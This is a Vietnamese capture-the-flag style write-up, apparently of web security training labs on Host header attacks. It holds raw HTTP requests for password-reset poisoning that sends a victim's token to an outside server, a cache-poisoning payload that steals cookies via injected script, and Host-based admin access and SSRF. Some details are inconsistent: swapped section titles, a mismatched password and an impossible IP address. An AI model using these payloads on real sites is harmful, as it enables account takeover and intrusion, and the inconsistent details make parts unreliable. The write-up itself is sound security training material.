# 1. Basic password reset poisoning
Dùng chức năng forgot password với tham số `username=wiener` rồi vào Email Client kiểm tra, thấy URL để reset password là `https://0a07003004a3df1ec0903b3f0007004e.web-security-academy.net/forgot-password?temp-forgot-password-token=R9Qgu9I1N6a2aN3P3siCSAQoNtJkOu2k`.

Thử thay đổi header `Host: test.com` rồi gửi lại, thì kết quả URL reset trở thành `https://test.com/forgot-password?temp-forgot-password-token=1kbaGZSQ0CofoeyPFQKHXUasCLvaewHH`. Như vậy website cấu hình URL reset password sử dụng Host header. 

Ta thay đổi header `Host: exploit-0a08009d04bfdf7bc0a03a1a018100ea.exploit-server.net` và chỉnh tham số `username=carlos`. Sau khi submit, vào Access Log kiểm tra thì thấy có request gửi đến chứa một reset password token:
```
10.0.4.223      2023-03-06 02:02:50 +0000 "GET /forgot-password?temp-forgot-password-token=PF9X5fUYYSTSeNjUjRK4Dxhrtw5TGKQO HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36"
```
Đó là reset token của user carlos. Ta truy cập `https://0a07003004a3df1ec0903b3f0007004e.web-security-academy.net/forgot-password?temp-forgot-password-token=PF9X5fUYYSTSeNjUjRK4Dxhrtw5TGKQO` rồi tiến hành đổi mật khẩu thành `hello`, sau đó đăng nhập với credentials `carlos:password`, kết quả thành công. 

# 2. Host header authentication bypass
Trong Home page có một đoạn tracking script:
```
<script type="text/javascript" src="//0ad4007504b85e20c0e9721e005e00d9.web-security-academy.net/resources/js/tracking.js">
```
Ta thử thêm một duplicate Host header vào trong request sử dụng Burp Repeater:
```
GET / HTTP/1.1
Host: 0ad4007504b85e20c0e9721e005e00d9.web-security-academy.net
Host: test.com
```
Khi đó, domain name trong tracking script cũng trở thành `test.com`. Để ý rằng website có sử dụng cache, và khi ta thay đổi Host header thứ 2 thì cache vẫn trả về trạng thái "hit". Như vậy ta có thể exploit web cache poisoning như sau:

Gửi request `GET /` với header
```
Host: 0ad4007504b85e20c0e9721e005e00d9.web-security-academy.net
Host: "></script><script>alert(document.cookie)</script>
```
Submit đến khi response chứa tag script được lưu vào cache. Khi victim truy cập home page, lệnh alert sẽ được thực thi.

Như vậy, bài lab được giải thành công.

# 3. Web cache poisoning via ambiguous requests
Thử vào URL `/admin` thì thấy thông báo "Admin interface only available to local users". 

Bắt request sử dụng Burp Repeater. Khi thay đổi header `Host: localhost` thì ta vẫn có thể truy cập được website, đồng thời "Admin panel" được hiển thị. Từ đó, ta khám phá ra được để delete user carlos thì ta cần gửi request đến `/admin/delete?username=carlos`. Cấu hình request như sau:
```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
....
```
Sau khi submit, bài lab được giải.

# 4. Routing-based SSRF
Dùng Burp Repeater bắt request đến Home page. Thử thay đổi header `Host: j5pxkiye8gmuytdbybbned2em5svgk.oastify.com`, gửi request rồi vào Burp Collaborator Client kiểm tra thì thấy có request được gửi đến. Như vậy ta có thể thực thi SSRF bằng cách thay đổi Host header.

![image](https://user-images.githubusercontent.com/103978452/223042227-5c76ea65-137f-4f82-8738-bf0a0e154300.png)

Gửi request vào Burp Intruder, thực hiện bruteforce với giá trị của Host header từ 192.168.0.0 đến 192.168.0.255, ta thấy chỉ có thể truy cập được nếu giá trị là 192.268.0.113

![image](https://user-images.githubusercontent.com/103978452/223042476-33db1f5d-599b-40a4-ae33-4011c5535214.png)

Dùng Burp Repeater gửi lại request với header `Host: 192.168.0.113`, ta được chuyển hướng đến URL `/admin`. Dựa trên trang đó, ta biết rằng muốn xóa user carlos thì cần gửi POST request đến `/admin/delete`. Như vậy ta cấu hình một request như sau:

```
POST /admin/delete HTTP/1.1
Host: 192.168.0.113
Content-Type: application/x-www-form-urlencoded
....

csrf=5dcGh6aSE9TEu9v545rRAs7WunnUtpLj&username=carlos
```
Sau khi click submit, bài lab được giải.

# 5. SSRF via flawed request parsing

# 6. Host validation bypass via connection state attack

# 7. Password reset poisoning via dangling markup